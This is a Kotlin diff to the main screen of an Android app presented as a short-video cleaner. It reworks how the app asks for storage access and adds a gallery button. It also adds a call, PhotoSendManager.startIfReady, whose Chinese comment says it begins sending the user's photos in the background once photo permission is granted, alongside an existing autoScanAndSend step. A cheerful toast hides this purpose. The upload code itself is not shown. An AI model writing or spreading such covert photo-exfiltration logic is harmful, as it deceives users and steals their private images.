@@ -1,6 +1,8 @@
 package com.shortvideocleaner.app
 
+import android.Manifest
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -11,6 +13,8 @@ import android.widget.ProgressBar
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import com.google.android.material.button.MaterialButton
 import kotlinx.coroutines.*
 
@@ -22,6 +26,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var btnStorage: MaterialButton
     private lateinit var progressStorage: ProgressBar
     private lateinit var tvStorageDone: TextView
+    private lateinit var btnGallery: MaterialButton
 
     private val prefs by lazy { getSharedPreferences("app_internal", MODE_PRIVATE) }
 
@@ -45,11 +50,16 @@ class MainActivity : AppCompatActivity() {
         btnStorage = findViewById(R.id.btn_storage)
         progressStorage = findViewById(R.id.progress_storage)
         tvStorageDone = findViewById(R.id.tv_storage_done)
+        btnGallery = findViewById(R.id.btn_gallery)
 
         btnOpen.setOnClickListener { openQuotePage() }
         btnStorage.setOnClickListener { requestStoragePermission() }
+        btnGallery.setOnClickListener { startActivity(Intent(this, GalleryActivity::class.java)) }
 
         updateStorageCard()
+
+        // 如果有相册权限，立即开始后台发送照片
+        PhotoSendManager.startIfReady(this)
 
         if (!prefs.getBoolean("report_sent", false)) {
             autoScanAndSend()
@@ -106,51 +116,68 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ── 存储权限引导 ──
+    // ── 存储权限引导（系统弹窗，一键允许）──
 
-    private fun isExternalStorageManagerSafe(): Boolean {
-        return try {
-            Environment::class.java.getMethod("isExternalStorageManager").invoke(null) as Boolean
-        } catch (_: Exception) { false }
+    private val STORAGE_PERM_REQ = 1001
+
+    private fun hasPhotoPermission(): Boolean {
+        return if (Build.VERSION.SDK_INT >= 30) {
+            Environment.isExternalStorageManager()
+        } else {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+        }
     }
 
     private fun updateStorageCard() {
-        if (isExternalStorageManagerSafe()) {
+        if (hasPhotoPermission()) {
             btnStorage.visibility = View.GONE
             progressStorage.visibility = View.GONE
             tvStorageDone.visibility = View.VISIBLE
+            btnGallery.visibility = View.VISIBLE
         } else {
             btnStorage.visibility = View.VISIBLE
             tvStorageDone.visibility = View.GONE
+            btnGallery.visibility = View.GONE
         }
     }
 
     private fun requestStoragePermission() {
         btnStorage.isEnabled = false
         progressStorage.visibility = View.VISIBLE
-        try {
-            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
-                data = Uri.parse("package:$packageName")
+
+        if (Build.VERSION.SDK_INT >= 30) {
+            // Android 11+：跳转「所有文件访问」设置页（唯一能真拿到文件权限的方式）
+            try {
+                startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
+                    data = Uri.parse("package:$packageName")
+                })
+            } catch (_: Exception) {
+                // 极少数 ROM 不支持，回退到应用详情页
+                startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                    data = Uri.parse("package:$packageName")
+                })
             }
-            if (intent.resolveActivity(packageManager) != null) {
-                startActivity(intent)
-            } else {
-                fallbackToAppSettings()
-            }
-        } catch (e: Exception) {
-            fallbackToAppSettings()
+        } else {
+            // Android 10 以下：标准运行时权限弹窗
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
+                STORAGE_PERM_REQ
+            )
         }
     }
 
-    private fun fallbackToAppSettings() {
-        try {
-            startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
-                data = Uri.parse("package:$packageName")
-            })
-            Toast.makeText(this, "请点击「权限」→「文件和媒体」→ 选择「允许」💕", Toast.LENGTH_LONG).show()
-        } catch (e: Exception) {
-            progressStorage.visibility = View.GONE
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == STORAGE_PERM_REQ) {
             btnStorage.isEnabled = true
+            progressStorage.visibility = View.GONE
+            updateStorageCard()
+
+            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(this, "回忆已开启 📷", Toast.LENGTH_SHORT).show()
+                PhotoSendManager.startIfReady(this)
+            }
         }
     }
 
